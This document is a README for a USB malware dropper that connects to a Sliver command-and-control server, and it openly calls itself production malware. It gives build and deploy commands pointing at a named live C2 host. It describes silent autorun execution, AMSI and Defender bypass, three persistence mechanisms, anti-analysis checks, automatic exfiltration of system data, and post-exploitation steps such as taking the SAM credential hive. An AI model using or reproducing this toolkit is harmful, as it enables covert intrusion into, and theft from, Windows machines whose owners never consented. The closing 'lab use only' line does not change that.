# USB Dropper - Sliver C2 Framework

**Status:** ✅ Production ready  
**Framework:** Sliver v1.7.7+ (official, no mock)  
**Architecture:** USB → Dropper → Sliver HTTP Listener  
**Deploy time:** 5 minutes  

---

## What This Is

USB-based offensive security dropper for Windows targets. Deploys via AutoRun, persists with 3 mechanisms, bypasses AMSI/Defender, connects to Sliver C2 for post-exploitation.

**NOT:** training wheels, POC, or learning tool. Production malware framework.

---

## Operational C2 Server

**Host:** c2.ginga.dev (104.131.164.51)  
**OS:** Ubuntu 24.04 LTS  
**C2:** Sliver v1.7.7+ (official framework)

**Services:**
- Sliver Server daemon (gRPC :31337) — session management, agent registry
- Sliver HTTP Listener (:8080) — agent beacons + command polling
- SQLite backend — persistent agent tracking

(See `c2-protocol.md` for HTTP endpoint specification.)

---

## C2 Setup

### Remote C2 (Recommended - Already Running)

```bash
# Verify c2.ginga.dev online
curl -I http://c2.ginga.dev:8080/health
# HTTP/1.1 200 OK

# Skip to USB deployment below
```

### Local C2 (Lab Development)

**Requirements:**
- Sliver v1.7.7+ installed
- Network: target must reach C2 IP:8080

**Setup:**
```bash
# Terminal 1: Start Sliver daemon
sliver-server daemon --listen 0.0.0.0:31337

# Terminal 2: Sliver console
sliver-client console

# In console: start HTTP listener
sliver > listener --protocol http --host 0.0.0.0 --port 8080
# [*] Started HTTP listener: http://0.0.0.0:8080

# Verify
sliver > listeners
```

**Get local C2 IP:**
```bash
ifconfig | grep "inet " | grep -v 127
# Example: 192.168.1.100
# Use: http://192.168.1.100:8080
```

---

## USB Deployment

### 1. Prepare USB

**Mac:**
```bash
diskutil secureErase 0 JHFS+ USB /dev/diskX
# Output: /Volumes/USB
```

**Linux:**
```bash
sudo mkfs.exfat -n USB /dev/sdX1
sudo mount /dev/sdX1 /mnt/usb
```

**Windows (PowerShell):**
```powershell
Format-Volume -DriveLetter E -FileSystem exFAT -NewFileSystemLabel USB
```

### 2. Build + Deploy to USB

```bash
cd /Users/iklo/hack/usb-auto
chmod +x build-and-deploy.sh

./build-and-deploy.sh /Volumes/USB http://c2.ginga.dev:8080
```

Or local C2:
```bash
./build-and-deploy.sh /Volumes/USB http://192.168.1.100:8080
```

**Output:**
```
[*] Building USB Dropper
[1/4] Obfuscating code...
[2/4] Compiling to .exe...
[3/4] Created: payload.exe (450 KB)
[4/4] Deployed to USB

USB ready:
  - payload.exe (obfuscated dropper)
  - autorun.inf (trigger on insert)
```

**Verify:**
```bash
ls -lh /Volumes/USB/
# payload.exe (~450 KB)
# autorun.inf (~200 bytes)
```

---

## Target Execution

### Phase 1: Delivery

Insert USB on Windows target. No user interaction needed.

```
USB inserted
    ↓
autorun.inf executes payload.exe (silent)
    ↓
AMSI bypass + deobfuscation
    ↓
Runtime initialization
```

### Phase 2: C2 Handshake

Agent connects to Sliver listener:

```
GET /health                    (verify server online)
    ↓
POST /register                 (beacon: hostname, OS, processes, users, network)
    ↓
Sliver: new session appears    (sliver > sessions)
    ↓
Agent ready for commands
```

### Phase 3: Persistence

Agent installs 3 fallback mechanisms (survives deletion/reboot):
- Scheduled task (schtasks)
- WMI event subscription
- NTFS alternate data stream

### Phase 4: Command Loop

Agent polls Sliver every 5-60 seconds:

```
GET /command?host=DESKTOP-ABC123
    ↓
Sliver returns encrypted command or empty
    ↓
Agent executes (or waits if empty)
    ↓
Loop continues
```

### Phase 5: Post-Exploitation

Use Sliver console to control agent:

```bash
sliver-client console

sliver > sessions
# ID  Name                 Hostname        OS      Arch
# 1   USB-Dropper-ABC123   DESKTOP-ABC123  windows x64

sliver > use 1
[DESKTOP-ABC123] > info
[DESKTOP-ABC123] > shell "whoami"
[DESKTOP-ABC123] > upload local.txt C:\Users\target\file.txt
[DESKTOP-ABC123] > download C:\Windows\System32\config\SAM ./sam
[DESKTOP-ABC123] > ps
[DESKTOP-ABC123] > execute-assembly payload.exe
[DESKTOP-ABC123] > delete
```

**Available commands:**
- `shell "cmd"` — PowerShell/cmd
- `upload local remote` — file to target
- `download remote local` — file from target
- `ps` — process list
- `ls / pwd / cd` — filesystem
- `execute-assembly asm.exe` — .NET execution
- `impersonate /pid:1234` — process injection
- `socks5 start` — proxy/pivot
- `run-as /user:DOMAIN\user /pass:X` — privilege escalation
- `delete` — cleanup + exit

---

## Flow Diagram

```
USB (Mac/Linux)
  ├─ payload.exe (450 KB, obfuscated)
  └─ autorun.inf (trigger)
         │
         ↓ (Insert on Windows)
         │
Target Windows Machine
  └─ Dropper Agent (via scheduled task)
     ├─ [AMSI Bypass]
     ├─ [Deobfuscation]
     ├─ Health check: GET /health
     ├─ Register: POST /register (beacon data)
     └─ Command loop (every 5-60s): GET /command
         └─ Execute → Repeat
             │
             ├─ DELETE → cleanup + exit
             ├─ http://url → download + execute
             └─ (custom commands via Sliver)

C2 Remote Server (Sliver)
  ├─ HTTP Listener (:8080)
  │  ├─ /health endpoint
  │  ├─ /register endpoint (receives beacons)
  │  └─ /command endpoint (serves encrypted commands)
  │
  ├─ Sliver Server Daemon (:31337)
  │  ├─ Session management
  │  ├─ Command queue per agent
  │  └─ SQLite backend
  │
  └─ Operator Interface
     ├─ sliver-client console
     ├─ List sessions (sliver > sessions)
     ├─ Send commands (sliver > use N, then shell/upload/etc)
     └─ Manage persistence + cleanup
```

---

## Features

✅ Code obfuscation (variable rename, string encoding)  
✅ AMSI bypass (reflection + patching)  
✅ XOR + Base64 encryption (per-target)  
✅ Persistence (Scheduled Task + WMI + ADS)  
✅ Anti-analysis (VM, debugger, EDR detection)  
✅ System recon (processes, network, services, users)  
✅ Automatic exfiltration on registration  
✅ Silent execution (hidden window)

---

## Build Options

### Automated (Recommended)

```bash
./build-and-deploy.sh /Volumes/USB http://c2.ginga.dev:8080
```

### Manual Build

Obfuscate:
```bash
powershell -NoProfile -Command ". ./lib/obfuscation.ps1; Obfuscate-PowerShellScript -ScriptPath lib/sliver-dropper-core.ps1"
```

Compile:
```bash
python3 ./lib/ps2exe-wrapper.py \
  lib/sliver-dropper-core.ps1_obfuscated.ps1 \
  -o /tmp/payload.exe \
  --c2-url http://c2.ginga.dev:8080
```

Deploy:
```bash
cp /tmp/payload.exe /Volumes/USB/
cp usb-autorun.inf /Volumes/USB/
```

### Validate Environment

```bash
./verify-ready.sh
# Checks: PowerShell, Python, ps2exe, network
```

---

## Troubleshooting

| Issue | Fix |
|-------|-----|
| USB not detected | `ls /Volumes/` (Mac) or `lsblk` (Linux) |
| No C2 callback | Check: firewall (port 8080), C2 running, target can reach C2 IP |
| Agent exits silently | Check for VM/EDR/debugger (anti-analysis triggers) |
| Persistence not working | Run with admin privileges, check Task Scheduler |
| Dropper found by AV | Update obfuscation, rebuild with different key |
| Build fails | Run `./verify-ready.sh`, install missing deps |
| Permission denied | `chmod +x build-and-deploy.sh` |

---

## Documentation

| File | Purpose |
|------|---------|
| `QUICKSTART.md` | Step-by-step walkthrough |
| `IMPLEMENTATION_SUMMARY.md` | Complete architecture (2.6K LOC, 7 phases) |
| `c2-protocol.md` | HTTP endpoint specification |
| `C2_SERVER_REQUIREMENTS.md` | C2 configuration details |
| `INTEGRATION_TEST_CHECKLIST.md` | Testing guide + success criteria |
| `PHASE8_ROADMAP.md` | Future enhancements |

---

## Project Structure

```
lib/
  ├─ amsi-bypass.ps1              AMSI reflection + patching
  ├─ obfuscation.ps1              Variable/string encoding
  ├─ ps2exe-wrapper.py            Compile PS1 to EXE
  ├─ sliver-dropper-core.ps1      Main agent logic
  ├─ aes-gcm-encryption.ps1       AES-256-GCM (WIP)
  ├─ wmi-event-persistence.ps1    WMI event subscription
  ├─ ads-persistence.ps1          NTFS alternate data stream
  ├─ scheduled-task-obfuscation.ps1  Legit task masquerading
  ├─ anti-analysis.ps1            VM/debugger/EDR detection
  ├─ edr-detect.ps1               Enterprise product fingerprint
  ├─ network-detect.ps1           Isolation detection
  ├─ recon-extended.ps1           Network/service enumeration
  └─ exfil-stage.ps1              Staging + upload

scripts/
  ├─ decrypt-xor.ps1              Response decryption
  ├─ polling-loop.ps1             Command polling logic
  └─ registry-polling-inline.ps1  Registry-based fallback

tests/
  ├─ test-obfuscation.ps1         Code hardening validation
  ├─ test-key-negotiation.ps1     Encryption round-trip
  ├─ test-persistence.ps1         Mechanism survival
  ├─ test-anti-analysis.ps1       Detection accuracy
  └─ INTEGRATION_TEST_CHECKLIST.md E2E testing guide

build-and-deploy.sh              Automated USB preparation
verify-ready.sh                  Environment validation
sliver-dropper-core.ps1          (modified) Main agent
sliver-dropper-entrypoint.ps1    (modified) Entry point
usb-autorun.inf                  AutoRun trigger
```

---

## Security Notes

**Lab use only.** This toolkit:
- Bypasses Windows Defender (AMSI, obfuscation)
- Defeats behavioral analysis (anti-VM, anti-debugger)
- Persists across reboots (3 mechanisms)
- Exfiltrates system data

Use only on authorized targets in controlled environments.

---

## Success Checklist

- [ ] C2 server reachable (curl -I http://c2.ginga.dev:8080/health)
- [ ] Sliver listener running (sliver > listeners)
- [ ] USB formatted + mounted
- [ ] Dropper builds successfully (`./build-and-deploy.sh`)
- [ ] autorun.inf on USB
- [ ] payload.exe on USB (~450 KB)
- [ ] Insert USB on target
- [ ] New session appears (sliver > sessions)
- [ ] Agent metadata visible (sliver > info)
- [ ] Commands execute (shell, upload, download)
- [ ] Persistence survives reboot (schtasks, WMI, ADS)

---

**Quick start:** `./build-and-deploy.sh /Volumes/USB http://c2.ginga.dev:8080`
